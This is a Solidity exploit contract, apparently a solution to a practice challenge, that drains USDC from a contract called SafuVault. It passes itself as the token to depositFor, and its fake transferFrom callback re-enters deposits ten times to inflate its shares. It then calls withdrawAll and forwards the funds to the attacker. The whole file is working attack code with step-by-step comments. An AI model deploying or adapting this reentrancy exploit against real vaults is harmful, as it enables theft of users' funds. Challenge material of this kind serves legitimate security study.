// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "src/safu-vault/SafuVault.sol";

contract Attack {
    address public attacker;
    SafuVault public safuVault;
    IERC20 public usdc;
    uint256 public loops;

    constructor(address _safuVault, address _usdcAddress) {
        attacker = msg.sender;
        safuVault = SafuVault(_safuVault);
        usdc = IERC20(_usdcAddress);
    }

    function startAttack() external {
        // get usdc balance of this contract = 10_000
        uint256 usdcBalance = usdc.balanceOf(address(this));

        uint256 usdcAmount = usdcBalance / 10;

        // call safuVault.depositFor() making it call transferFrom from this contract
        // with usdcAmount amount for user this address
        safuVault.depositFor(address(this), usdcAmount, address(this));

        // after the loop is done call withdrawAll() from SafuVault
        safuVault.withdrawAll();
        // transfer all usdc in this contract to the attacker
        usdc.transfer(attacker, usdc.balanceOf(address(this)));
    }

    // gets called after depositFor() in startAttack()
    function transferFrom(address from, address to, uint256 amount) external {
        if (loops < 10) {
            loops++;

            // transfer ammount = usdcAmount to the msg.sender = SafuVault
            usdc.transfer(msg.sender, amount);
            // again call depositFor() with amount = usdcAmount
            safuVault.depositFor(address(this), amount, address(this));
        }
    }
}
